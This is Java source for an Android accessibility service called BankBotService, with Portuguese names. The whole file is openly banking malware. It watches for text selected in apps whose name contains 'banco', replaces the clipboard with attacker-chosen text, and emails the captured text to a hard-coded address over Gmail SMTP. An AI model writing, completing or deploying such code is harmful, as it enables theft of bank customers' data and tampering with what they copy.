import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class BankBotService extends AccessibilityService {

    private static final String TAG = "BankBotService";
    private static final String EMAIL = "seu_email@gmail.com";
    private static final String SENHA = "sua_senha";
    private static final String DESTINATARIO_EMAIL = "email_destinatario@gmail.com";
    private static final String TEXTO_SUBSTITUTO = "Texto substituto pelo atacante";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            CharSequence selectedText = event.getText().toString();
            if (selectedText != null && !selectedText.toString().isEmpty()) {
                String appName = getAppName(event.getPackageName().toString());
                if (isBankApp(appName)) {
                    replaceCopiedText(selectedText.toString());
                    sendEmail(selectedText.toString(), appName);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "BankBot interrompido.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "BankBot conectado.");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "BankBot destruído.");
    }

    private String getAppName(String packageName) {
        PackageManager packageManager = getApplicationContext().getPackageManager();
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            return (String) packageManager.getApplicationLabel(applicationInfo);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Erro ao obter nome do aplicativo: " + e.getMessage());
        }
        return "";
    }

    private boolean isBankApp(String appName) {
        return appName.toLowerCase().contains("banco");
    }

    private void replaceCopiedText(String selectedText) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("label", TEXTO_SUBSTITUTO);
        clipboard.setPrimaryClip(clip);
    }

    private void sendEmail(final String content, final String appName) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");

                Session session = Session.getInstance(props,
                        new Authenticator() {
                            @Override
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(EMAIL, SENHA);
                            }
                        });

                try {
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(EMAIL));
                    message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(DESTINATARIO_EMAIL));
                    message.setSubject("Logs do BankBot");
                    message.setText("Texto copiado do " + appName + ":\n" + content);

                    Transport.send(message);
                    Log.d(TAG, "E-mail enviado com sucesso.");
                } catch (MessagingException e) {
                    Log.e(TAG, "Erro ao enviar e-mail: " + e.getMessage());
                }
            }
        }).start();
    }
}
